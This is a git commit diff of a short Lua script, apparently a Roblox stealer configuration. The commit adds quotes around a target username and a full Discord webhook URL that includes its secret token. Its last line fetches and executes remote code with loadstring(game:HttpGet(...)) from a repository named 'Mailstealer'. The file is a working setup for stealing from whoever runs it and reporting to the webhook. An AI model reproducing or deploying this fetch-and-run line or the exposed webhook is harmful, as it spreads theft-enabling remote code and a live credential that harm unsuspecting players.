d5ee94528e8e9691e5e65d5c59a93418c1d279e3
Hegejfvsjw <132260042+Hegejfvsjw@users.noreply.github.com>
2024-01-04 21:19:06 +0300

    Script.lua

--- Script.lua
+++ Script.lua
@@ -1,4 +1,4 @@
-Username = LEGACROW11
-Webhook = https://discord.com/api/webhooks/1192368625038925884/tbAufM4TZ8HU-Fdy_JG864eNm-gOXyHfJjb0k9BW4YmJoZXXK0cL6jJfpi6SZxu9LTXW
+Username = "LEGACROW11"
+Webhook = "https://discord.com/api/webhooks/1192368625038925884/tbAufM4TZ8HU-Fdy_JG864eNm-gOXyHfJjb0k9BW4YmJoZXXK0cL6jJfpi6SZxu9LTXW"
 LoadingScreen = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
